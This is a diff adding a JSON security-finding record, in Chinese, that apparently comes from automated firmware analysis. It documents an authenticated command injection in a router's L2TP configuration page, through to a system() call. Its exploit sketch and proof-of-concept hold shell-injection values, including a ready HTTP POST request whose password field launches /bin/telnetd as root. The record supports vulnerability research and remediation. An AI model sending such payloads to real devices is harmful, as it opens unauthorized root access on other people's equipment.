@@ -1,0 +1,32 @@
+{
+  "job_id": "beb9836a7b28",
+  "title": "httpd L2TP 配置处理器命令注入（认证后，经 uclited system() 执行）",
+  "severity": "high",
+  "confidence": 0.6,
+  "vuln_class": "command-injection",
+  "cwe": "CWE-78",
+  "binary_md5": "9582aa23b0bc2de099b9997b09457d01",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/squashfs-root/usr/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 的 L2TP 配置处理器 sub_4820C0（/userRpm/L2TPCfgRpm.htm）从 HTTP POST 参数 L2TPName、L2TPPwd 直接 strncpy 进 L2TP 配置结构（偏移 +284 用户名、+540 密码），未经任何 shell 元字符过滤（仅对 sta_ip/mask/gw/dns 做 swChkDotIpAddr、对服务器名做 swChkPptpL2tpLegalDomain）。配置经 swSetL2tpCfg 调 ucSetL2tpCfg + l2tpActiveCfg 写入共享配置，最终在 uclited 进程的 l2tpCmdReq 中调用 l2tpFormatCmd，将用户名/密码用 sprintf 拼入命令行 \"xl2tpd -c /tmp/l2tpd.conf user \\\"%s\\\" password \\\"%s\\\" ...\" 后执行 system()，造成命令注入（需已认证管理员触发 Connect/Save）。",
+  "evidence": [
+    "httpd sub_4820C0 @ 0x4820c0: Env=httpGetEnv(a1,\"L2TPName\") strncpy((char*)&s[71], Env, 0xFF) （用户名，无过滤）",
+    "同函数 L2TPPwd: strncpy((char*)&s[135], v4, 0xFF) （密码，无过滤）",
+    "sub_4820C0 → swSetL2tpCfg(s) @ httpd 0x4b7c30 → ucSetL2tpCfg(0,a1) + l2tpActiveCfg(a1)",
+    "uclited l2tpCmdReq @ 0x44b3a8: pppSetWanParameter(...); l2tpFormatCmd(v2, byte_5450F4); system(byte_5450F4)",
+    "uclited l2tpFormatCmd @ 0x44b748: sprintf(a2, \"xl2tpd -c %s user \\\"%s\\\" password \\\"%s\\\" \", a1+284, a1+540) → 注入点"
+  ],
+  "session_id": "s-mt87iubv-b93b",
+  "function_name": "sub_4820C0",
+  "preconditions": "已认证管理员登录 httpd，WAN 连接类型配置为 L2TP，向 /userRpm/L2TPCfgRpm.htm 提交含恶意 L2TPName/L2TPPwd 的 POST（带 Save 或 Connect 参数）。httpd 与 uclited 通过共享配置（nvram）联通，触发 uclited l2tpCmdReq 的 system()。",
+  "exploit_sketch": "用户名或密码字段注入 shell 元字符。例如 L2TPPwd 设为 `123\";/bin/telnetd;#` 或 `\";iwconfig;#` 使 system() 拼出的命令变为 \"…password \\\"\\\";<注入命令>;#\\\" …\"，从而实现 root 命令执行。需绕过 httpd 认证。",
+  "remediation": "对 L2TPName/L2TPPwd 应用与域名一致的严格字符白名单校验（仅字母数字及 .-_ 等），或使用带参数数组的 execv 而非 system()/sprintf 拼接，杜绝 shell 元字符。理想做法是走 pppd/xl2tpd 参数数组接口，不经过 shell。",
+  "poc": "POST /userRpm/L2TPCfgRpm.htm?Save=save HTTP/1.1\\r\\nHost: 192.168.1.1\\r\\nCookie: <已认证会话>\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: <n>\\r\\n\\r\\nL2TPName=user;L2TPPwd=x%22;/bin/telnetd;%23&Connect=connect&IpType=1&L2TPServerName=l2tp.example.com",
+  "call_chain": "httpDispatcher(0x425d08) → httpRpmConfAdd 路由 /userRpm/L2TPCfgRpm.htm → sub_4820C0(0x4820c0)[httpGetEnv L2TPName/L2TPPwd strncpy 到 +284/+540] → swSetL2tpCfg(0x4b7c30) → ucSetL2tpCfg + l2tpActiveCfg(0x44af48) → uclited l2tpCmdReq(0x44b3a8) → l2tpFormatCmd(0x44b748)[拼 system 命令] → system(byte_5450F4)",
+  "function_addr": "0x4820c0",
+  "id": "F-mt87vqye-7be2",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-25T05:21:05Z",
+  "history": []
+}
